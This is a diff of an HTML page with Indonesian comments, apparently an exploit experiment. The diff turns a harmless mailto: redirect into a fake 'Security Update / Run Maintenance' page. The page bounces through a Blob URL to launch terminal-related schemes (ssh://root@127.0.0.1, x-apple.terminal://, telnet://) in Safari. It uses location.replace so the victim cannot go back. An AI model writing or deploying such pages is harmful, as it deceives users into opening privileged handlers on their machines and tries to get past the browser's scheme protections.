@@ -1,71 +1,75 @@
-=<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Check</title>
+<title>Security Update</title>
 <style>
-  body { background: #111; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-  button { padding: 15px 30px; background: #007aff; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+  body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .panel { background: #2a2a2a; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+  h1 { margin-bottom: 10px; }
+  p { color: #aaa; margin-bottom: 20px; }
+  button { padding: 15px 30px; background: #007aff; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; }
+  button:hover { background: #005bb5; }
 </style>
 </head>
 <body>
 
-<button id="startBtn">Buka Aplikasi (Valid Scheme)</button>
+<div class="panel">
+  <h1>🔒 System Update</h1>
+  <p>Klik untuk menjalankan skrip pemeliharaan.</p>
+  <button id="startBtn">Run Maintenance</button>
+</div>
 
 <script>
 (function () {
   'use strict';
 
   document.getElementById('startBtn').addEventListener('click', function() {
-    // ============================================
-    // 1. GUNAKAN SKEMA YANG VALID (WHITELISTED)
-    // ============================================
-    // Safari mengizinkan skema seperti 'tel:', 'mailto:', atau 'sms:' tanpa peringatan.
-    // Skema seperti 'slack://' atau 'terminal://' akan memicu error "alamat tidak sah"
-    // karena Safari tidak mengenali aplikasi tersebut atau memblokirnya.
     
-    // GANTI DENGAN SKEMA YANG SAH:
-    var targetScheme = "mailto:security@apple.com?subject=Laporan%20Bug"; 
-    // Atau gunakan: "tel:123456789" (untuk menelepon)
+    // ============================================
+    // 1. VARIAN SKEMA TERMINAL
+    // ============================================
+    // Coba ganti targetScheme di bawah ini satu per satu jika yang lain gagal:
+    
+    // Opsi A: SSH (Paling sering memicu Terminal di Mac)
+    var targetScheme = "ssh://root@127.0.0.1"; 
+    
+    // Opsi B: Skema internal Terminal Apple
+    // var targetScheme = "x-apple.terminal://";
+    
+    // Opsi C: Telnet
+    // var targetScheme = "telnet://127.0.0.1";
 
     console.log("Target Scheme: " + targetScheme);
 
     // ============================================
-    // 2. BUAT BLOB PAYLOAD
+    // 2. BLOB PAYLOAD (BATU LONCATAN)
     // ============================================
-    // Pastikan tidak ada karakter aneh yang bisa merusak URL di dalam script
     var payloadHTML = `
       <!DOCTYPE html>
       <html>
       <head><title>Redirecting...</title></head>
-      <body style="background:#000;color:#fff;text-align:center;padding-top:20vh;font-family:monospace;">
-        <h1>Redirecting to Valid Scheme...</h1>
+      <body style="background:#000;color:#0f0;text-align:center;padding-top:20vh;font-family:monospace;">
+        <h1>Executing...</h1>
         <script>
-          // Gunakan location.replace() bukan location.href agar tidak meninggalkan history
+          // Eksekusi setelah 100ms agar Safari sempat me-render halaman Blob
           setTimeout(function() {
-            try {
-              // Safari membutuhkan URL yang 100% valid (tidak ada spasi atau karakter ilegal)
-              window.location.replace("${targetScheme}");
-            } catch(e) {
-              document.body.innerHTML += "<p style='color:red'>Error: " + e.message + "</p>";
-            }
-          }, 500);
+            // Gunakan location.replace agar tidak bisa di-back
+            window.location.replace("${targetScheme}");
+          }, 100);
         <\/script>
       </body>
       </html>
     `;
 
     // ============================================
-    // 3. BUAT BLOB & REDIRECT
+    // 3. TRIGGER BLOB URL
     // ============================================
-    // Pastikan tipe MIME benar
-    var blob = new Blob([payloadHTML], { type: 'text/html;charset=utf-8' });
+    var blob = new Blob([payloadHTML], { type: 'text/html' });
     var blobUrl = URL.createObjectURL(blob);
 
-    console.log("Blob URL: " + blobUrl);
-
-    // Arahkan halaman utama ke Blob URL
+    // Arahkan tab utama ke Blob
     window.location.href = blobUrl;
   });
 
